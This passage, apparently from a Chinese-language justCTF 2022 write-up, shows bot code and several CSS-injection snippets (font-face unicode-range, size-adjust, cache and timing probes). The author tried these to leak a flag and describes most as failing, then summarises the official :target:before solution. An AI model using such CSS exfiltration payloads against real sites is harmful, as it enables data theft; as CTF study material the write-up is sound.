+        WebDriverWait<span class="token punctuation">(</span>browser<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>until<span class="token punctuation">(</span><span class="token keyword">lambda</span> r<span class="token punctuation">:</span> r<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string">'return document.readyState'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'complete'</span><span class="token punctuation">)</span>
+        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>timeout<span class="token punctuation">)</span>
+
+        browser<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+        WebDriverWait<span class="token punctuation">(</span>browser<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">.</span>until<span class="token punctuation">(</span><span class="token keyword">lambda</span> r<span class="token punctuation">:</span> r<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string">'return document.readyState'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'complete'</span><span class="token punctuation">)</span>
+        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Error visiting'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> traceback<span class="token punctuation">.</span>format_exc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">,</span> flush<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    <span class="token keyword">finally</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Done visiting'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">,</span> flush<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    visit_url<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token string">"ok"</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>先來講一下我看到這題之後的想法，因為 CSS injection 可以做，內容又在頁面上，所以自然而然會想到 <code>font-face</code> 搭配 <code>unicode-range</code> 的做法，像這樣：</p>
+<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
+  <span class="token property">font-family</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">;</span>
+  <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://example.com<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+  <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+006A<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token selector">.nickname > span:nth-child(1)</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">font-family</span><span class="token punctuation">:</span> A1<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>這樣只要 flag 的第一個字是 <code>U+006A</code>，就會套用指定的字體，不過這邊字體被 CSP 限制不能載入，所以這招過不了。</p>
+<p>而我想到的另外一招是用 <a target="_blank" rel="noopener" href="https://web.dev/css-size-adjust/">size-adjust</a> 搭配 local font：</p>
+<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
+  <span class="token property">font-family</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">;</span>
+  <span class="token property">src</span><span class="token punctuation">:</span> <span class="token function">local</span><span class="token punctuation">(</span>Arial<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token property">size-adjust</span><span class="token punctuation">:</span> 1000%<span class="token punctuation">;</span>
+  <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+006A<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token selector">.nickname > span:nth-child(1)</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">font-family</span><span class="token punctuation">:</span> A1<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>畫面會變成這樣：</p>
+<p><img src="/img/justctf-2022-writeup/p2.png" alt="original UI"></p>
+<p>我原本的想法是，假設 ninja cookie 會偵測到「按鈕出現在畫面上」才去點擊，那我就可以用上面這招把按鈕推離畫面，ninja cookie 就不會點。然後如果字體沒有配對到，按鈕就不會被推走，就會點到按鈕。透過這個 oracle 來 leak 出 flag。</p>
+<p>不過有兩個問題，第一個問題是上面的截圖可以看到字體放大是往右跟往上長，推不到下面的內容。這個倒是好解決，我們用 CSS 更改一下排版，就可以讓版面橫著長：</p>
+<p><img src="/img/justctf-2022-writeup/p3.png" alt="adjusted UI"></p>
+<p>第二個問題最為致命，那就是 ninja cookie 的 :visible 是指一個元素是否有寬高，有的話都是 visible，所以出不出現在畫面上是沒差的，因此這招就 gg 了。</p>
+<p>我想到的第二個招式是 cache probing，可以這樣寫：</p>
+<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
+  <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"A1"</span><span class="token punctuation">;</span>
+  <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/static/bootstrap.min.css?q=1<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+  <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+0041<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>如果有配對到，字體就會載入 <code>/static/bootstrap.min.css?q=1</code>，雖然說不會載入成功，但是瀏覽器應該會保存 cache，就算沒有 cache，也有 304 not modified 的機制，response 應該會比其他東西快。</p>
+<p>不過實測過後發現第一是速度其實沒差多少，第二是 bot 裡面用了 <code>disk-cache-size=1</code> 這個 flag，不得不說考慮的真是周到。</p>
+<p>順帶一提，常用的 scroll bar 跟 lazy loading image 也都被封掉了。</p>
+<p>我想到的第三招是我們可以這樣做：</p>
+<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
+  <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"A1"</span><span class="token punctuation">;</span>
+  <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/static/bootstrap.min.css?q=1<span class="token punctuation">)</span></span><span class="token punctuation">,</span> 
+    <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/static/bootstrap.min.css?q=2<span class="token punctuation">)</span></span><span class="token punctuation">,</span>
+    ....
+    <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/static/bootstrap.min.css?q=500<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+  <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+0041<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>因為 bot 的程式碼是長這樣：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">browser<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+WebDriverWait<span class="token punctuation">(</span>browser<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">.</span>until<span class="token punctuation">(</span><span class="token keyword">lambda</span> r<span class="token punctuation">:</span> r<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string">'return document.readyState'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'complete'</span><span class="token punctuation">)</span>
+time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>假設字體沒有配對到，那造訪 bot 後拿到 response 時間應該是 30 秒上下。如果有配對到，就會發出一堆 request 去拿字體，network 就會一直有東西，就會更晚才符合停止條件，拿到 response 的時間就會更久。</p>
+<p>所以從 response 時間可以得到有沒有配對成功。</p>
+<p>但這招也行不通，因為 CSS 最多只能 140 個字。</p>
+<p>還有其他招我沒有去試的，例如說可以結合一開始提到的 <code>size-adjust</code> 跟 animation，有符合的話就一直瘋狂切換字體，像這樣：</p>
+<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token atrule"><span class="token rule">@keyframes</span> t</span> <span class="token punctuation">&#123;</span>
+    <span class="token selector">0%</span> <span class="token punctuation">&#123;</span> <span class="token property">font-family</span><span class="token punctuation">:</span> A1<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
+    <span class="token selector">50%</span> <span class="token punctuation">&#123;</span> <span class="token property">font-family</span><span class="token punctuation">:</span> rest<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
+  <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"A1"</span><span class="token punctuation">;</span>
+  <span class="token property">size-adjust</span><span class="token punctuation">:</span> 1000%<span class="token punctuation">;</span>
+  <span class="token property">src</span><span class="token punctuation">:</span> <span class="token function">local</span><span class="token punctuation">(</span>Arial<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+0041<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token selector">.nickname > span:nth-child(1)</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">font-family</span><span class="token punctuation">:</span> A1<span class="token punctuation">;</span>
+  <span class="token property">animation</span><span class="token punctuation">:</span> 0.01s t 0 infinite<span class="token punctuation">;</span> 
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>這樣一直切換字體，寬度就會一直變，layout 就要一直重排，應該會比較耗效能，只要能找到方式偵測這點就行了。</p>
+<p>第一種可能是 ninja cookie 點擊的速度會變慢，但想了想 extension 應該是別的 thread 在負責，雖然沒測過就是了。第二種可能是 iframe 把網站跟自己的 exploit 疊起來，再用一些 JS 去算這件事，但因為這題有擋 iframe 所以也無法。</p>
+<p>總之呢，這只是個想法而已，但要實作或是要成功應該還有一段距離。</p>
+<p>底下來講一下官方解法，利用了 <code>:target</code> 這個 selector 搭配 <code>:before</code> 來載入背景圖片。</p>
+<p>我知道有 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/CSS/::target-text">::target-text</a> 來配對到 highlight 的部分，但之前看過只有部分屬性可以用，不知道原來 <code>:target</code> 也會配對到。</p>
+<p>所以這題解法就是利用 <code>:target:before</code> 來載入圖片，然後用 HTML injection + ninja cookie 的點擊來觸發 scroll。</p>
+<p>完整解法可看：<a target="_blank" rel="noopener" href="https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb">https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb</a></p>
+<p>相關技術可看：<a target="_blank" rel="noopener" href="https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/">New technique of stealing data using CSS and Scroll-to-Text Fragment feature.</a></p>
+<h2><span id="dank-shark0-solves">Dank Shark(0 solves)</span></h2><p>這題完全沒看，不太知道在幹嘛，以後有機會再回來看（雖然這樣寫就代表九成九不會再回來看）。</p>
+<p>先附一下 <a target="_blank" rel="noopener" href="https://discord.com/channels/656258740252704788/978312189159030805/985647413832323153">discord</a> 中討論串的解法：</p>
+<ol>
+<li>use 0day request smugling in js_challange module</li>
+<li>just write short 64length xss in nickname (iptables was not working on remote)</li>
+<li>use cache poisoning&#x2F;golang sync.pool buffer bug (if you close http connection without reading you have leak in next connection)</li>
+</ol>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Security/">#Security</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2022/07/09/google-ctf-2022-writeup/">GoogleCTF 2022 筆記</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2022/06/02/defcon-2022-qual-writeup/">DEF CON CTF 2022 Qualifier 筆記</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+<div class="comments">
+    <h3 class="title is-4">評論</h3>
+    <script src="https://utteranc.es/client.js"
+        repo="aszx87410/huli-blog"
+        issue-term="title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</div>
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2023 Huli&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+<div class="column is-narrow has-text-centered">
+    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
+        <div class="dropdown-trigger">
+            <button class="button is-small" aria-haspopup="true">
+                <span class="icon">
+                    <i class="fas fa-globe"></i>
+                </span>
+                <span>繁體中文</span>
+                <span class="icon is-small">
+            <i class="fas fa-angle-down" aria-hidden="true"></i>
+          </span>
+            </button>
+        </div>
+        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
+            <div class="dropdown-content">
+            <!-- NOTE: 永遠回到首頁 -->
+            
+                <a href="/2022/06/14/en/justctf-2022-writeup/" class="dropdown-item">
+                    English
+                </a>
+            
+            </div>
+        </div>
+    </div>
+</div>
+
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+
+
+
+    
+    
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js?v=3.js"></script>
+
+
+    
+</body>
+</html>
